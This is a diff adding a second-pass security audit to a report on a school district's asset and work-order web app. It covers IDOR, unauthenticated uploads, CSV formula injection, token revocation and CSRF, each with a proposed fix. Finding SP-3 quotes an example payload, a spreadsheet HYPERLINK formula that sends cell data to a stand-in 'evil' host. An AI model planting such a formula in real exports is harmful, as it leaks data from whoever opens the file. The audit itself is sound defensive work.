@@ -517,4 +517,188 @@ React's JSX interpolation escapes HTML automatically. However, if any component 
 
 ---
 
+# Second-Pass Audit (2026-06-10)
+
+A second independent review focused on categories the first pass did not sweep:
+object-level authorization (IDOR), file storage/serving, CSV/formula injection,
+email header injection, token lifecycle/revocation, Prisma `orderBy` injection,
+route shadowing, and verification of the 47 first-pass fixes.
+
+## Verification of First-Pass Fixes
+
+All 47 first-pass findings were re-checked against the committed code and are
+correctly implemented. Spot-verified in detail: CSP directives (`server.ts`),
+dual JWT secrets, OAuth `state` cookie validation, cookie scoping/flags
+(`config/cookies.ts`), graceful shutdown with 10s force-exit, `audit_log` table
+usage in PO/inventory/invoice controllers, group-membership caching with Graph
+fallback, magic-number upload validation (`utils/fileMagic.ts`), user-sync
+concurrency guard, refresh rate limiter, and removal of Zustand `persist` from
+`authStore.ts`. No regressions found.
+
+Checked and clean (no finding): email header injection (recipient addresses come
+from the DB, nodemailer MIME-encodes subjects), device checkout double-assign
+race (serializable transaction), CORS origin allow-list, raw SQL usage (single
+documented atomic counter), `dangerouslySetInnerHTML` (zero occurrences in
+frontend), unauthenticated endpoints (only the four expected OAuth/logout routes).
+
+---
+
+## Second-Pass Findings
+
+### ~~SP-1~~ ✅ — ~~Damage-Incident Photos Served Without Authentication~~
+**Files:** `backend/src/server.ts` (lines 139–145), `backend/src/routes/damageIncident.routes.ts` (line 22)
+
+`/uploads/driver-licenses` is correctly blocked and served through an
+authenticated endpoint, but everything else under `/uploads` — including
+damage-incident photos — is served by `express.static` with **no authentication**.
+UUID filenames make URLs unguessable, but any leaked URL (browser history, chat,
+logs, proxy caches) is permanently accessible to anyone, and photos may show
+student devices, name labels, or room interiors.
+
+**Fix:** Apply the same pattern as driver licenses: block static access to
+`/uploads/damage-incidents` and serve photos through an authenticated
+`GET /api/damage-incidents/:id/photos/:photoId` endpoint guarded by
+`requireDeviceManagementAccess()`.
+
+---
+
+### SP-2 🟡 — Work Order Level-3 Location Scoping Enforced Only on List, Not on Direct Object Access
+**File:** `backend/src/services/work-orders.service.ts` (lines 334, 453, 488)
+
+The documented permission model (header of `work-orders.routes.ts`) says level 3 =
+"View/update work orders **at their location(s)**". The list query
+(`getWorkOrders`) enforces this scope, but direct-by-ID access does not:
+
+- `getWorkOrderById` only rejects level ≤ 2 non-owners — a level-3 user can read **any** work order by ID
+- `updateWorkOrder` only checks ownership for `permLevel < 3` — a level-3 user can edit **any** work order district-wide
+- `updateStatus` checks only the transition's `minLevel`, never location — a level-3 user can transition any ticket
+
+This is horizontal privilege escalation between staff at different schools, and a
+mismatch between the documented and enforced model.
+
+**Fix:** In all three methods, when `permLevel === 3` (and 4), resolve the user's
+location IDs (same logic as `getWorkOrders`) and reject if the ticket's
+`officeLocationId` is outside them and the user is neither reporter nor assignee.
+
+---
+
+### SP-3 🟡 — CSV Export Has No Quoting and No Formula-Injection Neutralization
+**File:** `backend/src/services/inventory.service.ts` (lines 1201–1228)
+
+`exportToExcel` builds CSV by raw `join(',')`:
+1. **Formula injection:** values beginning with `=`, `+`, `-`, or `@` (e.g., an
+   equipment name of `=HYPERLINK("http://evil/?"&A1,"x")`) execute when the CSV
+   is opened in Excel. Names/asset tags are user-editable by any TECHNOLOGY
+   level-2 user, and the export is opened by admins.
+2. **Structural corruption:** a comma, quote, or newline in any name/brand/model
+   silently shifts columns for every following field.
+
+**Fix:** Quote every field (`"…"` with internal quotes doubled) and prefix
+values starting with `=`, `+`, `-`, `@`, tab, or CR with `'`. Or implement the
+planned exceljs `.xlsx` export, which stores strings as inert text.
+
+---
+
+### SP-4 🟡 — No Server-Side Refresh-Token Revocation or Reuse Detection
+**File:** `backend/src/controllers/auth.controller.ts` (refresh: lines 536–554, logout: lines 607–643)
+
+Refresh tokens are stateless JWTs. Rotation issues a new token on every refresh,
+but the **previous token remains valid until its 7-day expiry** — rotation
+without invalidation provides no security benefit against theft. Logout only
+clears cookies; a stolen refresh token keeps working for up to 7 days after the
+user logs out, and there is no detection of the same token being used twice
+(the classic stolen-token signal).
+
+**Fix:** Add a `jti` claim, persist active token IDs (or families) per user in
+the DB, invalidate the old `jti` on rotation and all of the user's `jti`s on
+logout, and treat reuse of a rotated-out token as compromise (revoke the family,
+log a security event). The existing `users` table makes this a small migration.
+
+---
+
+### SP-5 ⚪ — `GET /api/inventory/import` Is Shadowed by `GET /api/inventory/:id` (Dead Endpoint)
+**File:** `backend/src/routes/inventory.routes.ts` (lines 116–121 vs 246–250)
+
+`GET /inventory/:id` is registered before `GET /inventory/import`, so requests
+for the import-job list match the `:id` route with `id = "import"`, fail UUID
+param validation, and return 400. The import-jobs list endpoint is unreachable.
+(`/inventory/import/:jobId` is unaffected — three segments.)
+
+**Fix:** Register `/inventory/import` (and any other literal sub-paths) before
+`/inventory/:id`, matching the comment pattern already used for `bulk-delete`.
+
+---
+
+### SP-6 🔵 — Free-String `sortBy` Reaches Prisma `orderBy` (Unhandled 500s)
+**Files:** `backend/src/services/deviceAssignment.service.ts` (line 309), `backend/src/services/damageIncident.service.ts` (line 233), `backend/src/services/inventory.service.ts` (line 203), `backend/src/validators/invoice.validators.ts` (line 60), `backend/src/validators/repairTicket.validators.ts` (line 38)
+
+Several validators declare `sortBy: z.string()` rather than an enum, and the
+services interpolate it directly: `orderBy: { [sortBy]: sortOrder }`. Any value
+that is not a real column (`?sortBy=foo`) throws `PrismaClientValidationError`
+→ 500. Other modules (referenceData, emailQueueAdmin, fundingSource, room,
+workOrderCategory) already use `z.enum([...])` correctly.
+
+**Fix:** Convert the remaining `sortBy` validators to `z.enum` whitelists of
+sortable columns.
+
+---
+
+### SP-7 🔵 — Inventory Import Accepts the File Upload Before the Permission Check
+**File:** `backend/src/routes/inventory.routes.ts` (lines 234–239)
+
+On `POST /inventory/import`, `upload.single('file')` (multer, 10 MB in-memory)
+runs **before** `requireModule('TECHNOLOGY', 3)`. Any authenticated level-1 user
+can repeatedly stream 10 MB bodies into server memory before receiving 403.
+`driverLicense.routes.ts` already orders these correctly (permission first).
+
+**Fix:** Move `requireModule('TECHNOLOGY', 3)` before `upload.single('file')`.
+
+---
+
+### SP-8 🔵 — CSRF Token Is Not Session-Bound and Never Rotated
+**File:** `backend/src/middleware/csrf.ts` (lines 38–53)
+
+The double-submit token is generated once per browser (24 h cookie) and is not
+tied to the authenticated session, nor rotated at login/logout. Plain
+double-submit is acceptable here given `SameSite=Strict` and the CORS
+allow-list, but binding the token to the session (e.g., HMAC of the user ID) or
+rotating it on login would close the residual cookie-forcing class of attacks.
+
+---
+
+### SP-9 🔵 — Group-Membership Cache Extends the Permission-Revocation Window (Accepted Tradeoff)
+**File:** `backend/src/controllers/auth.controller.ts` (lines 450–492)
+
+With the ARCH-3 cache, a user removed from an Entra group retains the derived
+role/permissions for up to `GROUP_MEMBERSHIP_CACHE_TTL_MS` (30 min) plus the
+access-token lifetime. This is a reasonable tradeoff and `isActive` is still
+checked on every refresh — documenting it here so the window is a known,
+deliberate quantity. Consider clearing `groupsLastSyncedAt` from the admin user
+screen as a manual "force re-sync" for urgent revocations.
+
+---
+
+### SP-10 🔵 — `POST /api/auth/logout` Has No CSRF Protection
+**Files:** `backend/src/routes/auth.routes.ts`, `backend/src/controllers/auth.controller.ts` (line 607)
+
+Logout is a state-changing POST with no `validateCsrfToken`. Impact is limited
+to forced logout (nuisance), and `SameSite=Lax` on the access cookie already
+blocks cross-site POSTs in modern browsers — but adding the guard is one line
+and makes the mutation surface uniform.
+
+---
+
+## Second-Pass Summary
+
+| Severity | Count | IDs |
+|---|---|---|
+| 🔴 Critical | 0 | — |
+| 🟠 High | 1 | SP-1 |
+| 🟡 Medium | 3 | SP-2, SP-3, SP-4 |
+| 🔵 Low / Info | 5 | SP-6, SP-7, SP-8, SP-9, SP-10 |
+| ⚪ Quality | 1 | SP-5 |
+| **Total** | **10** | |
+
+---
+
 *Generated by automated static analysis. Findings should be validated by a developer with full runtime context before implementing fixes.*
